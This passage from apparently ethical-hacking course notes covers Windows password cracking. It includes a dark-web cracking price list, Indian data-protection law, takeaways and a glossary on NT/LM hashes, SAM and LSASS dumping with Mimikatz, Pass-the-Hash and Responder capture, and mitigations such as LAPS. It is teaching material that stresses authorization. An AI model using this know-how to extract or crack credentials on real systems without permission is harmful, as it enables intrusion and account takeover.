**Cracking-as-a-Service (dark web):**
- NT Hash cracking (full wordlist + rules): $5–$20 per hash
- NTLMv2: $10–$50 per hash
- Turnaround: hours for common passwords

This commoditizes cracking — no technical skill required, just a purchase.

---

### 5.3 DPDPA 2023 and Password Security

| Law | Relevance |
|---|---|
| **DPDPA 2023, Section 8** | Mandates "appropriate technical and organisational measures" to protect personal data. A SAM database exposure that leaks employee NT Hashes = a DPDPA data breach (employee username + password combination = personal data). |
| **IT Act 2000, S. 43(a)** | Querying or extracting from systems without authorization = civil liability. |
| **IT Act 2000, S. 66** | Criminal version — up to 3 years imprisonment and/or ₹5 lakh fine. |

**What "appropriate measures" means for passwords in 2026:**
- Minimum 14+ character passwords (NIST SP 800-63B guidance)
- MFA on all privileged accounts
- Annual internal credential audits using cracking tools (find weak passwords before attackers do)
- Disabling legacy auth (NTLM) wherever possible
- Incident response plan covering credential exposure scenarios

**DPDPA 2023 Section 33 penalty scale:**
- Data breach: up to **₹250 crore** (₹2.5 billion)
- Failure to notify breach: up to **₹200 crore**

> [!WARNING]
> Every technique in this session requires **explicit written authorization** from the system owner before execution. Having the technical skill does not grant the legal right.

---

## ✅ Key Takeaways

- [x] Password cracking is a **forward search** — hash candidates and compare. Never a reversal of the hash function.
- [x] Dictionary attacks cover 30–40% of all human-chosen passwords using `rockyou.txt` alone.
- [x] Brute force against NT Hash: 8-char full ASCII cracks in ~4.6 hours on cloud GPU for ~$150 in 2026. **8 chars is not safe.**
- [x] Rainbow tables are precomputed hash→plaintext lookups — instant for unsalted hashes (NT Hash). Completely defeated by salting.
- [x] Rule-based attacks are the most effective against human-chosen passwords — they mirror how people add "complexity."
- [x] NT Hash = `MD4(UTF-16-LE(password))` — no salt, very fast algorithm. Maximally vulnerable combination.
- [x] LM Hash has THREE catastrophic weaknesses: case insensitive, split into two 7-char halves, DES on known plaintext.
- [x] SAM is kernel-locked and SYSKEY-encrypted. Extracting hashes requires VSS, registry export, or Mimikatz LSASS extraction.
- [x] NT Hash of empty password = `31D6CFE0D16AE931B73C59D7E0C089C0` — no cracking needed, just authenticate empty.
- [x] LM disabled placeholder = `AAD3B435B51404EE` — seeing this as both halves means LM is off and only NT Hash is active.
- [x] Pass-the-Hash uses the NT Hash **directly** to authenticate — NTLM uses the hash as the signing key, not the cleartext.
- [x] Responder = LLMNR/NBNS poisoning + fake auth servers → captures NTLMv2 hashes for offline cracking.
- [x] NTLMv2 cracking requires two operations per candidate (MD4 + HMAC-MD5) → slower than SAM cracking but ~3–5B/sec on GPU.
- [x] LAPS (unique per-machine local admin passwords) is the single most effective PtH lateral movement prevention.
- [x] PassGAN and LLM-based wordlists crack passwords that evade traditional rule sets — AI-generated candidates follow patterns not expressible in fixed rules.

---

<details>
<summary>📖 Glossary</summary>

| Term | Definition |
|---|---|
| **Password Cracking** | Recovering plaintext passwords from hashes via forward hash computation and comparison. Never a reversal or decryption. |
| **Dictionary Attack** | Cracking using a precompiled wordlist. Each word is hashed and compared to the target. Fastest for common passwords. |
| **Brute Force Attack** | Exhaustive search through all combinations within a defined charset and length. Guaranteed — but exponentially slow for long passwords. |
| **Hybrid Attack** | Combines wordlist with brute force appending/prepending (e.g., word + 2 digits). |
| **Rule-Based Attack** | Applies transformation rules to wordlist entries to generate human-like variants (capitalize, leet, digit append, etc.). |
| **Mask Attack** | Brute force constrained by a per-position character type pattern (`?u?l?l?d?d`). Efficient for policy-constrained passwords. |
| **Rainbow Table** | Precomputed hash→plaintext lookup table for a specific algorithm, charset, and max length. Defeated by salting. |
| **Salt** | A random value added to a password before hashing. Ensures identical passwords produce different hashes. Kills rainbow tables. NT Hash has NO salt. |
| **NT Hash** | Current Windows hash: `MD4(UTF-16-LE(password))`. 32 hex chars, no salt. Fast to crack. |
| **LM Hash** | Legacy Windows hash (pre-Vista). Case insensitive, split into two 7-char halves, DES on known plaintext. |
| **SAM** | Security Account Manager. Windows registry hive (`config\SAM`) storing local account NT/LM Hashes. Kernel-locked while OS runs. |
| **SYSKEY** | 128-bit boot key encrypting the SAM database. Stored in the SYSTEM hive. Required to decrypt SAM contents. |
| **NTDS.DIT** | Active Directory database on Domain Controllers. Contains NT Hashes for ALL domain users. |
| **LSASS** | Local Security Authority Subsystem Service. Windows process holding decrypted hashes (and sometimes cleartext) for logged-in users in memory. |
| **Mimikatz** | Post-exploitation tool by Benjamin Delpy. Extracts credentials from LSASS memory. Requires SYSTEM privilege. |
| **secretsdump.py** | Impacket tool for remote SAM / NTDS.DIT / LSA Secrets extraction over SMB. |
| **Pass-the-Hash (PtH)** | Authenticating to NTLM services using the NT Hash directly — no cleartext password needed. |
| **Credential Guard** | Windows VBS feature isolating LSASS in protected virtual memory. Mimikatz cannot extract from it. |
| **LAPS** | Local Administrator Password Solution. Generates unique random local admin passwords per machine, stored in AD. Blocks PtH lateral movement. |
| **Protected Users** | AD security group whose members are denied NTLM auth — forced to use Kerberos only. Blocks PtH for members. |
| **Responder** | Python tool (Laurent Gaffie). Performs NBNS/LLMNR/WPAD poisoning + runs fake auth servers to capture NTLMv2 hashes. |
| **NTLMv2 Response** | The auth credential sent over the network: username, domain, server challenge, client challenge, HMAC-MD5 response. Hashcat mode `-m 5600`. |
| **WDigest** | Windows auth provider that caches cleartext passwords in LSASS. Disabled by default in Win8.1+. If enabled, Mimikatz recovers cleartext. |
| **Hashcat** | GPU-accelerated password cracking tool. Industry standard. Supports 300+ hash types. |
| **John the Ripper** | Classic open-source cracker with automatic hash format detection. Easier to use than Hashcat for beginners; slower on GPU. |
| **rockyou.txt** | 14-million entry wordlist from the 2009 RockYou plain-text breach. Located at `/usr/share/wordlists/rockyou.txt` on Kali. |
| **best64.rule** | Hashcat ruleset with 77 transformation rules. Applied to rockyou.txt = ~1 billion candidates. |
| **PassGAN** | GAN-based password generation tool trained on leaked databases. Generates human-pattern candidates not in standard wordlists or fixed rules. |
| **VSS** | Volume Shadow Copy Service. Windows backup snapshots that bypass the SAM file lock. |
| **RID 500** | Windows built-in Administrator account Relative Identifier. Always 500 — identifies it in any SAM dump regardless of rename. |
| **T1110.002** | MITRE ATT&CK: Brute Force — Password Cracking (offline hash cracking). |
| **T1003.002** | MITRE ATT&CK: OS Credential Dumping — SAM. |
| **T1550.002** | MITRE ATT&CK: Use Alternate Authentication Material — Pass the Hash. |

</details>

---

**Upcoming Topics — Session 11D**
Session 11D covers DDoS architecture, botnet mechanics, and countermeasures. The machines I've owned through 11A–11C don't just become targets — they become **bots**. 11D explains how a C2 infrastructure is built, how bots receive attack commands, and how DDoS is used either as a primary attack (extortion, disruption) or as a **smoke screen** to occupy the SOC while a separate credential/exfiltration operation runs elsewhere.

**The chain:**
- 11A: Find the targets
- 11B: Understand the targets
- 11C: Own the targets
- **11D: Use owned targets to attack others**

---